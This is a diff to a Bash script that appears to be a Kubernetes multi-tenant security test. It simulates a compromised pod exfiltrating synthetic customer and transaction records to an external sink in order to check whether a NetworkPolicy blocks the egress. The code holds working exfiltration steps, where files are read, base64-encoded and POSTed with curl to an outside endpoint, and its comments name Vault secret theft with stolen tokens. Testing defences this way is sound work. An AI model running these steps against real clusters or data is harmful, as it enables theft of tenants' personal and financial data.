@@ -5,9 +5,21 @@
 # Spec      : Rev6 Section 13 (A7 scope constraint — origin, CORRECTED)
 # Objective : exfiltrate tenant data or steal Vault-issued dynamic secrets
 #
-# # Techniques (spec-aligned, with implementable substitute where noted):
-#   T1 — Direct Egress        tenant-finserv pod streams mock PII to an
-#                              external endpoint via outbound connection
+# Techniques (spec-aligned, with implementable substitute where noted):
+#   T1 — Direct Egress        tenant-finserv pod streams REAL mock PII +
+#                              transaction-record data (Tenants/
+#                              finserv-data.yaml — a PVC seeded with 20
+#                              synthetic customer records + 200 synthetic
+#                              transactions, brief Section 13) to an
+#                              external endpoint via outbound connection.
+#                              REVISION 6 UPDATE: previously a hardcoded
+#                              "stolen=data" placeholder string with no
+#                              actual dataset behind it — now exfiltrates
+#                              genuine (synthetic) file content. Falls back
+#                              to the old placeholder, logged explicitly as
+#                              a degraded path, only if the PVC isn't found
+#                              (e.g. a cluster whose Tenants/deploy.sh ran
+#                              before finserv-data.yaml existed).
 #   T2 — Vault Secret Theft   a stolen SA token AND a genuinely-fetched
 #                              SPIFFE SVID (via the SPIRE Workload API,
 #                              Controls/c7-vault Part 2) belonging to the
@@ -83,16 +95,54 @@ case "$TECHNIQUE" in
 
   t1-direct-egress)
     [[ -z "$ATTACKER_POD" ]] && skip "no-attacker-pod-in-$ATTACKER_NS"
-    echo "[A7-t1] data egress — POST mock PII to external sink $EXFIL_SINK"
-    EGRESS_OUT=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
-      sh -c "curl -s -o /dev/null -w '%{http_code}' --max-time 8 \
-        -X POST -d 'stolen=data&tenant=${VICTIM_NS}' \
-        '${EXFIL_SINK}' 2>/dev/null" 2>/dev/null || echo "000")
+    echo "[A7-t1] data egress — POST mock PII/transaction data to external sink $EXFIL_SINK"
+
+    HAS_DATA=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
+      sh -c '[ -f /data/finserv/customers.json ] && [ -f /data/finserv/transactions.csv ] && echo yes || echo no' \
+      2>/dev/null || echo "no")
+
+    if [[ "$HAS_DATA" == "yes" ]]; then
+      # Real dataset present (Tenants/finserv-data.yaml, applied by
+      # Tenants/deploy.sh) — exfiltrate actual mock PII/transaction content,
+      # not a placeholder string. Sampled (all 20 customers + first 50
+      # transaction rows, not the full 200) to keep the exec'd curl command
+      # line a reasonable size. The read (kubectl exec cat) and the base64
+      # encoding both happen via/on the driver host, NOT inside the pod —
+      # that's just data retrieval over the Kubernetes API and isn't what
+      # this technique is testing. The actual attack vector (and the only
+      # step L5's NetworkPolicy can see or block) is the curl POST below,
+      # which runs from inside the attacker pod itself.
+      echo "[A7-t1] real mock PII/transaction PVC present — exfiltrating actual content"
+      RECORD_COUNT=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
+        sh -c 'tail -n +2 /data/finserv/transactions.csv | wc -l' 2>/dev/null || echo "0")
+      PAYLOAD_B64=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
+        sh -c 'cat /data/finserv/customers.json; head -51 /data/finserv/transactions.csv' 2>/dev/null \
+        | base64 | tr -d '\n')
+      [[ -z "$PAYLOAD_B64" ]] && skip "finserv-data-present-but-unreadable"
+      EGRESS_OUT=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
+        sh -c "curl -s -o /dev/null -w '%{http_code}' --max-time 8 \
+          -X POST --data-urlencode tenant='${VICTIM_NS}' \
+          --data-urlencode payload_b64='${PAYLOAD_B64}' \
+          '${EXFIL_SINK}' 2>/dev/null" 2>/dev/null || echo "000")
+      DETAIL="http${EGRESS_OUT} egress-reached-sink real-mock-pii-exfiltrated total-txn-records=${RECORD_COUNT}"
+    else
+      # Fallback for a cluster whose Tenants/deploy.sh ran before
+      # finserv-data.yaml existed — still functional, but logged clearly as
+      # a degraded path rather than silently indistinguishable from the
+      # real-data path above.
+      echo "[A7-t1] (fallback) mock-data PVC not found — re-run Tenants/deploy.sh to provision it"
+      echo "[A7-t1]   (Tenants/finserv-data.yaml) — using placeholder payload for this trial"
+      EGRESS_OUT=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
+        sh -c "curl -s -o /dev/null -w '%{http_code}' --max-time 8 \
+          -X POST -d 'stolen=data&tenant=${VICTIM_NS}' \
+          '${EXFIL_SINK}' 2>/dev/null" 2>/dev/null || echo "000")
+      DETAIL="http${EGRESS_OUT} egress-reached-sink FALLBACK-placeholder-payload-no-pvc"
+    fi
     echo "[A7-t1] egress HTTP: $EGRESS_OUT"
     # Any HTTP response (>=100) means TCP egress reached the sink.
     # 000 means NetworkPolicy dropped the packet before TCP handshake.
     [[ "$EGRESS_OUT" =~ ^[1-9][0-9][0-9]$ ]] \
-      && succeed "t1-direct-egress" "http${EGRESS_OUT} egress-reached-sink" \
+      && succeed "t1-direct-egress" "$DETAIL" \
       || blocked "t1-direct-egress" "netpol-blocked http=$EGRESS_OUT"
     ;;
 
